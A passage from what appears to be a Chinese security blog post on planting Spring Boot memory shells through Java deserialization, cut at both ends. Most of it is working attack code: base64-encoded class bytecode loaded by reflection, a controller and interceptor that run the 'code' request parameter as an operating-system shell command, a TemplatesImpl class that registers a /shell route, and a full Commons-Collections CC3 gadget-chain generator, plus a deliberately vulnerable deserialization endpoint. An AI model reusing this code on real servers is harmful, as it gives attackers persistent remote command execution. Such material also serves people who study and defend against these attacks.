XZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQATcmVkaXJlY3RFcnJvclN0cmVhbQEAHShaKUxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL09iamVjdDspVgEABWZsdXNoAQAFY2xvc2UAIQAnACgAAQApAAAABAABACoAKwABACwAAAAvAAEAAQAAAAUqtwABsQAAAAIALQAAAAYAAQAAAAwALgAAAAwAAQAAAAUALwAwAAAAAQAxADIAAwAsAAACJwAGAAsAAADcKxICuQADAgA6BBkExgDOLLkABAEAOgUSBbgABrYABxIItgAJmQAiuwAKWQa9AAtZAxIMU1kEEg1TWQUZBFO3AA46BqcAH7sAClkGvQALWQMSD1NZBBIQU1kFGQRTtwAOOgYZBgS2ABFXGQa2ABI6B7sAE1m7ABRZGQe2ABW3ABa3ABc6CBIYOgm7ABlZtwAaOgoZCLYAG1k6CcYAIBkKuwAZWbcAGhkJtgAcEh22ABy2AB62ABxXp//bsgAfGQq2ACAZBRkKtgAhGQW2ACIZBbYAI6cABToFA6wErAABAA8A0wDWACQAAwAtAAAAVgAVAAAADwAKABAADwASABcAFAAnABUARgAXAGIAGQBpABoAcAAbAIUAHACJAB0AkgAeAJ0AHwC6ACEAwgAiAMkAIwDOACQA0wAmANYAJQDYACcA2gApAC4AAAB6AAwAQwADADMANAAGABcAvAA1ADYABQBiAHEAMwA0AAYAcABjADcAOAAHAIUATgA5ADoACACJAEoAOwA8AAkAkgBBAD0APgAKAAAA3AAvADAAAAAAANwAPwBAAAEAAADcAEEAQgACAAAA3ABDAEQAAwAKANIARQA8AAQARgAAAFUAB/0ARgcARwcASPwAGwcASf8ALwALBwBKBwBLBwBMBwBNBwBHBwBIBwBJBwBOBwBPBwBHBwBQAAAn/wAbAAUHAEoHAEsHAEwHAE0HAEcAAQcAUQEBAFIAAAAEAAEAJABTAAAADQMAPwAAAEEAAABDAAAAAQBUAFUAAwAsAAAAYAAFAAUAAAAKKissLRkEtwAlsQAAAAIALQAAAAoAAgAAAC4ACQAvAC4AAAA0AAUAAAAKAC8AMAAAAAAACgA/AEAAAQAAAAoAQQBCAAIAAAAKAEMARAADAAAACgBWAFcABABSAAAABAABACQAUwAAABEEAD8AAABBAAAAQwAAAFYAAAABAFgAWQADACwAAABgAAUABQAAAAoqKywtGQS3ACaxAAAAAgAtAAAACgACAAAAMwAJADQALgAAADQABQAAAAoALwAwAAAAAAAKAD8AQAABAAAACgBBAEIAAgAAAAoAQwBEAAMAAAAKAFoAWwAEAFIAAAAEAAEAJABTAAAAEQQAPwAAAEEAAABDAAAAWgAAAAEAXAAAAAIAXQ==&quot;</span>;<br>        <span class="hljs-type">byte</span>[] d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(code);<br>        java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class&#125;);<br>        m.setAccessible(<span class="hljs-literal">true</span>);<br>        Class&lt;?&gt; clazz = (Class&lt;?&gt;) m.invoke(Thread.currentThread().getContextClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;org.clown.springbootmemoryshell.interceptor.TestInterceptor&quot;</span>, d, <span class="hljs-number">0</span>, d.length&#125;);<br>        Constructor&lt;?&gt; constructor = clazz.getConstructor();<br>        <span class="hljs-type">HandlerInterceptor</span> <span class="hljs-variable">evilInterceptor</span> <span class="hljs-operator">=</span> (HandlerInterceptor) constructor.newInstance();<br>        System.out.println(<span class="hljs-string">&quot;Instance created: &quot;</span> + evilInterceptor);<br><span class="hljs-comment">//        TestInterceptor evilInterceptor = new TestInterceptor();</span><br>        adaptInterceptors.add(evilInterceptor);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Interceptor added!&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="实战中反序列化利用内存马"><a href="#实战中反序列化利用内存马" class="headerlink" title="实战中反序列化利用内存马"></a>实战中反序列化利用内存马</h1><p>前面的写法还不能满足实战利用，实战中通常结合反序列化的形式，不过改成实战利用也蛮简单的，就是结合链子比如TemplatesImpl里的恶意类代码就是我们前面所写的的恶意代码</p><p>先写一个简单的反序列化漏洞的路由</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VulnContorller</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(value = &#123;&quot;/des&quot;&#125;, method = &#123;RequestMethod.POST&#125;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;base64Data&quot;)</span> String base64Data)</span> &#123;<br>        System.out.println(base64Data);<br>        <span class="hljs-type">byte</span>[] serializedData = Base64.getMimeDecoder().decode(base64Data);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">option</span> <span class="hljs-operator">=</span> deserializeData(serializedData);<br>        <span class="hljs-keyword">return</span> option;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">deserializeData</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] serializedData)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(serializedData);<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bis);<br>            ois.readObject();<br>            ois.close();<br>            bis.close();<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="反序列化利用controller"><a href="#反序列化利用Controller" class="headerlink" title="反序列化利用Controller"></a>反序列化利用Controller</h2><p>我们要注册的controller</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">arg0</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;code&quot;</span>);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>            <span class="hljs-keyword">if</span> (arg0 != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                ProcessBuilder p;<br>                <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, arg0&#125;);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, arg0&#125;);<br>                &#125;<br><br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(p.start().getInputStream())).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                o = c.hasNext() ? c.next() : o;<br>                c.close();<br>                writer.write(o);<br>                writer.flush();<br>                writer.close();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                response.sendError(<span class="hljs-number">404</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var8) &#123;<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后是TemplatesImpl恶意类</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.clown;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ControllerBehind</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//加载magicController类的字节码</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;yv66vgAAADQAhQoAIQBBCABCCwBDAEQLAEUARggARwgASAoASQBKCgAMAEsIAEwKAAwATQcATgcATwgAUAgAUQoACwBSCABTCABUBwBVCgALAFYKAFcAWAoAEgBZCABaCgASAFsKABIAXAoAEgBdCgASAF4KAF8AYAoAXwBhCgBfAF4LAEUAYgcAYwcAZAcAZQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA7TG9yZy9jbG93bi9zcHJpbmdib290bWVtb3J5c2hlbGwvY29udG9ybGxlci9UZXN0Q29udHJvbGxlcjsBAAR0ZXN0AQBSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspVgEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEAAW8BABJMamF2YS9sYW5nL1N0cmluZzsBAAFjAQATTGphdmEvdXRpbC9TY2FubmVyOwEABGFyZzABAAZ3cml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQANU3RhY2tNYXBUYWJsZQcATwcAZgcATgcAVQcAYwEAEE1ldGhvZFBhcmFtZXRlcnMBAApTb3VyY2VGaWxlAQATVGVzdENvbnRyb2xsZXIuamF2YQwAIgAjAQAEY29kZQcAZwwAaABpBwBqDABrAGwBAAABAAdvcy5uYW1lBwBtDABuAGkMAG8AcAEAA3dpbgwAcQByAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAB2NtZC5leGUBAAIvYwwAIgBzAQAHL2Jpbi9zaAEAAi1jAQARamF2YS91dGlsL1NjYW5uZXIMAHQAdQcAdgwAdwB4DAAiAHkBAAJcQQwAegB7DAB8AH0MAH4AcAwAfwAjBwBmDACAAIEMAIIAIwwAgwCEAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAOW9yZy9jbG93bi9zcHJpbmdib290bWVtb3J5c2hlbGwvY29udG9ybGxlci9UZXN0Q29udHJvbGxlcgEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQAJc2VuZEVycm9yAQAEKEkpVgAhACAAIQAAAAAAAgABACIAIwABACQAAAAvAAEAAQAAAAUqtwABsQAAAAIAJQAAAAYAAQAAAA0AJgAAAAwAAQAAAAUAJwAoAAAAAQApACoAAgAkAAABqAAGAAgAAACzKxICuQADAgBOLLkABAEAOgQtxgCTEgU6BRIGuAAHtgAIEgm2AAqZACG7AAtZBr0ADFkDEg1TWQQSDlNZBS1TtwAPOganAB67AAtZBr0ADFkDEhBTWQQSEVNZBS1TtwAPOga7ABJZGQa2ABO2ABS3ABUSFrYAFzoHGQe2ABiZAAsZB7YAGacABRkFOgUZB7YAGhkEGQW2ABsZBLYAHBkEtgAdpwAMLBEBlLkAHgIApwAETrEAAQAAAK4AsQAfAAMAJQAAAEoAEgAAABAACQARABEAEgAVABMAGQAVACkAFgBHABgAYgAbAHgAHACMAB0AkQAeAJgAHwCdACAAogAhAKUAIgCuACYAsQAkALIAJwAmAAAAXAAJAEQAAwArACwABgAZAIkALQAuAAUAYgBAACsALAAGAHgAKgAvADAABwAJAKUAMQAuAAMAEQCdADIAMwAEAAAAswAnACgAAAAAALMANAA1AAEAAACzADYANwACADgAAAApAAj+AEcHADkHADoHADn8ABoHADv8ACUHADxBBwA5+AAa+QAIQgcAPQAAPgAAAAkCADQAAAA2AAAAAQA/AAAAAgBA&quot;</span>;<br>            <span class="hljs-type">byte</span>[] d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(code);<br>            java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class&#125;);<br>            m.setAccessible(<span class="hljs-literal">true</span>);<br>            Class&lt;?&gt; clazz = (Class&lt;?&gt;) m.invoke(Thread.currentThread().getContextClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;org.clown.springbootmemoryshell.contorller.TestController&quot;</span>, d, <span class="hljs-number">0</span>, d.length&#125;);<br>            Constructor&lt;?&gt; constructor = clazz.getConstructor();<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> constructor.newInstance();<br>            System.out.println(<span class="hljs-string">&quot;Instance created: &quot;</span> + instance);<br>            <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>            <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/shell&quot;</span>);<br>            <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>            <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br><span class="hljs-comment">//        Method mm = (Class.forName(&quot;org.clown.springbootmemoryshell.contorller.TestController&quot;).getDeclaredMethods())[0];</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">mm</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethods()[<span class="hljs-number">0</span>];<br>            rs.registerMapping(info, instance, mm);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>其实把前面的拿来复用一下就可以了，只不过这里再把流程完整记录一下</p><p>然后本地加了一个cc依赖，用cc3来打入内存马进行测试</p><p>cc3exp：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.clown;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3Chain</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-comment">//利用反射设置需要满足的值</span><br>        Class c=templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;ControllerBehind.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        bytecodes.set(templates,codes);<br>        <span class="hljs-comment">//这里的赋值在序列化的时候就不需要了</span><br><span class="hljs-comment">//        Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="hljs-comment">//        tfactory.setAccessible(true);</span><br><span class="hljs-comment">//        tfactory.set(templates,new TransformerFactoryImpl());</span><br><span class="hljs-comment">//        Transformer transformer = templates.newTransformer();</span><br>        <span class="hljs-comment">//结合前面的链子串联起来，随便一个都行</span><br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;),<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        Map&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotation</span> <span class="hljs-operator">=</span> c1.getDeclaredConstructor(Class.class, Map.class);<br>        annotation.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) annotation.newInstance(Override.class,lazyMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotation.newInstance(Override.class, proxyMap);<br>        System.out.println(serialize(o));<br><span class="hljs-comment">//        unserialize(&quot;ser.bin&quot;);</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        oos.writeObject(obj);<br>        oos.close();<br>        <span class="hljs-type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(bytes);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>生成的base64字符串</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"><br></code></pre></td></tr></table></figure><p>然后传给漏洞路由，记得url编码一下</p><p><img src="https://cdn.clown2024.cn/image-20241114161649942.png" alt="image-20241114161649942"></p><p>然后现在就是成功打入了，返回error是链子反序列化的时候抛异常但是代码已经是执行了的</p><p>现在访问shell路由就可以执行任意命令了</p><p><img src="https://cdn.clown2024.cn/image-20241114161757835.png" alt="image-20241114161757835"></p><h2 id="反序列化利用interceptor"><a href="#反序列化利用Interceptor" class="headerlink" title="反序列化利用Interceptor"></a>反序列化利用Interceptor</h2><p>这里的利用也类似，那就走一遍流程</p><p>要注册的Interceptor</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.interceptor;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.ModelAndView;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;code&quot;</span>);<br>        <span class="hljs-keyword">if</span>(code != <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span> 